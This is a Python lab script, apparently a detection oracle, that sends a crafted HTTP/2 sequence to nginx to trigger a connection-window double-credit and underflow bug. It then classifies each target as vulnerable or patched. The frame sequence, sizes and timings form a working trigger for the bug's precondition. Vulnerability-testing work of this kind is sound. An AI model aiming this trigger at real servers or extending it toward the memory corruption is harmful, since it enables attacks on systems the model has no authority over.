#!/usr/bin/env python3
"""Safe differential oracle for CVE-2026-123007 (NGINX2Root).

Drives nginx's connection-level HTTP/2 flow-control accounting through
the sequence that makes the vulnerable build credit the connection
window twice for the same queued DATA:

  1. handshake advertising SETTINGS_INITIAL_WINDOW_SIZE = 0
  2. open N streams (GET /big.bin) — bodies pending, nothing sendable
  3. raise the connection send window to NGX_HTTP_V2_MAX_WINDOW (2^31-1)
  4. grant each stream credit: nginx builds DATA frames until the socket
     stalls; with many streams the per-stream staged chunks leave
     several MiB of DATA queued in nginx's outbound queue while we read
     nothing (kernel backpressure; no PING flood — a flood trips nginx's
     10000-frame cap with FRAME_SIZE_ERROR on both builds)
  5. stream-0 WINDOW_UPDATE "first return" of R bytes: credit handed
     back while most of that DATA is still queued
       vulnerable: capacity check is  window > MAX - send_window
                   (queued-but-unsent DATA is invisible) — accepted
       patched:    check counts send_queued — capacity is only the
                   bytes actually sent, so the frame is rejected with
                   FLOW_CONTROL_ERROR and the connection is terminated
  6. RST_STREAM every stream; the drain then makes each stream's writer
     fail with "output on closed stream", the request is freed and
     ngx_http_v2_filter_cleanup returns the still-queued DATA credit
     AGAIN (no upper-bound check in 1.31.8)
       vulnerable: send_window = 2^31 - 1 + (R - sent) > MAX
  7. probe: one oversized stream-0 WINDOW_UPDATE
       vulnerable → MAX - send_window underflows (size_t), frame
                    ACCEPTED, the tagged PING is answered
       patched    → already terminated at step 5

This oracle never drives the out-of-bounds copy: no memory is
corrupted on either side. Run inside the lab's probe container:

    docker compose exec probe python /poc/diagnose.py
"""

from __future__ import annotations

import argparse
import socket
import sys
import time

from h2lib import (
    DATA,
    GOAWAY,
    H2Client,
    H2_MAX_WINDOW,
    PING,
    FLAG_ACK,
    ERR_FLOW_CONTROL_ERROR,
)

N_STREAMS = 120          # under nginx's default http2_max_concurrent_streams (128)
GRANT_PER_STREAM = 256 << 10  # credit per stream; staged DATA stalls at ~64 KiB/stream
FIRST_RETURN = 4 << 20   # > kernel-drained share (~0.8 MiB), < measured capacity (~8.5 MiB)
PROBE_INCREMENT = 1 << 20
PROBE_PING = b"probe001"  # exactly 8 bytes: a PING of any other length is SIZE_ERROR

DIED_AT_FIRST_RETURN = (
    "connection terminated by peer right after the first-return "
    "WINDOW_UPDATE (FLOW_CONTROL_ERROR; GOAWAY is dropped behind the "
    "clogged DATA, the patched check counts queued-but-unsent DATA)"
)


def server_settings_seen(frames: list[dict]) -> bool:
    return any(f["type"] == 4 and not f["flags"] & FLAG_ACK for f in frames)


def summarize(frames: list[dict]) -> dict[int, int]:
    counts: dict[int, int] = {}
    for f in frames:
        counts[f["type"]] = counts.get(f["type"], 0) + 1
    return counts


def goaway_of(frames: list[dict]):
    return next((f for f in frames if f["type"] == GOAWAY), None)


def probe_target(host: str, port: int) -> dict:
    ev: list[str] = []
    c = H2Client(host, port)
    try:
        hs = c.handshake(initial_window=0)
        if not server_settings_seen(hs):
            head = c.buf[:64] if c.buf else b"<no bytes>"
            return {"verdict": "NOT-H2", "evidence": [f"no server SETTINGS; first bytes: {head!r}"]}
        ev.append("handshake ok (initial window 0)")

        sids = [1 + 2 * i for i in range(N_STREAMS)]
        for sid in sids:
            c.open_stream(sid, "/big.bin", f"{host}:{port}")
        ev.append(f"opened {N_STREAMS} streams (GET /big.bin)")

        # connection window -> NGX_HTTP_V2_MAX_WINDOW, then stage + queue the
        # DATA; do NOT read: kernel backpressure must keep frames in nginx's
        # outbound queue until the RST cleanup runs.
        c.window_update(0, H2_MAX_WINDOW - 65535)
        for sid in sids:
            c.window_update(sid, GRANT_PER_STREAM)
        time.sleep(0.6)
        ev.append(f"granted {N_STREAMS}x{GRANT_PER_STREAM >> 10} KiB "
                  "(DATA staged, socket stalled by not reading)")

        # first return: credit for DATA that is still queued
        c.window_update(0, FIRST_RETURN)

        # RST every stream; on the patched build the connection dies at the
        # first return and these sends may fail — that death IS the signal.
        try:
            for sid in sids:
                c.rst(sid)
        except (BrokenPipeError, ConnectionResetError, OSError):
            return {"verdict": "PATCHED", "evidence": ev + [DIED_AT_FIRST_RETURN]}
        ev.append(f"first return {FIRST_RETURN >> 20} MiB on stream 0, RST all streams")

        # drain: delivers the kernel backlog, makes the RST'd streams' writers
        # fail ("output on closed stream") and the cleanups return the queued
        # DATA credit a second time (vulnerable only).
        time.sleep(0.4)
        c.fill(2.0)
        frames = c.parse_buffered()
        data_bytes = sum(f["len"] for f in frames if f["type"] == DATA)
        ev.append(
            f"post-RST drain: {summarize(frames)}, DATA={data_bytes} bytes "
            "(queued DATA was reclaimed by cleanup, only the drained share arrives)"
        )
        goaway = goaway_of(frames)
        if goaway is not None:
            err = goaway.get("error")
            ev.append(f"GOAWAY error={err} last_sid={goaway.get('last_sid')}")
            if err == ERR_FLOW_CONTROL_ERROR:
                return {"verdict": "PATCHED", "evidence": ev}
            return {"verdict": "UNCLEAR", "evidence": ev}
        if c.eof:
            return {"verdict": "PATCHED", "evidence": ev + [DIED_AT_FIRST_RETURN]}

        # the probe: an oversized stream-0 WINDOW_UPDATE + a tagged PING
        c.window_update(0, PROBE_INCREMENT)
        c.ping(PROBE_PING)
        time.sleep(0.3)
        c.fill(1.5)
        frames = c.parse_buffered()
        ev.append(f"post-probe frames: {summarize(frames) or 'none'}")
        probed = any(
            f["type"] == PING and f["flags"] & FLAG_ACK and f["payload"] == PROBE_PING
            for f in frames
        )
        goaway = goaway_of(frames)
        if goaway is not None:
            ev.append(f"GOAWAY error={goaway.get('error')} last_sid={goaway.get('last_sid')}")
        if probed:
            ev.append("probe PING answered after oversized WINDOW_UPDATE "
                      "(capacity check underflowed: send_window > 2^31-1)")
            return {"verdict": "VULNERABLE", "evidence": ev}
        if goaway is not None and goaway.get("error") == ERR_FLOW_CONTROL_ERROR:
            return {"verdict": "PATCHED", "evidence": ev}
        return {"verdict": "UNCLEAR", "evidence": ev}
    except (socket.timeout, TimeoutError):
        return {"verdict": "UNCLEAR", "evidence": ev + ["timeout"]}
    except ConnectionResetError:
        return {"verdict": "UNCLEAR", "evidence": ev + ["connection reset by peer"]}
    finally:
        c.close()


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument(
        "targets",
        nargs="*",
        default=["vuln:8080", "fixed:8080", "mitigated:8080"],
        help="host:port pairs (default: the three lab services)",
    )
    args = ap.parse_args()

    rc = 0
    for target in args.targets:
        host, _, port = target.rpartition(":")
        result = probe_target(host, int(port))
        print(f"[{target}] {result['verdict']}")
        for line in result["evidence"]:
            print(f"    - {line}")
        if result["verdict"] in ("VULNERABLE", "PATCHED", "NOT-H2"):
            continue
        rc = 1
    return rc


if __name__ == "__main__":
    sys.exit(main())
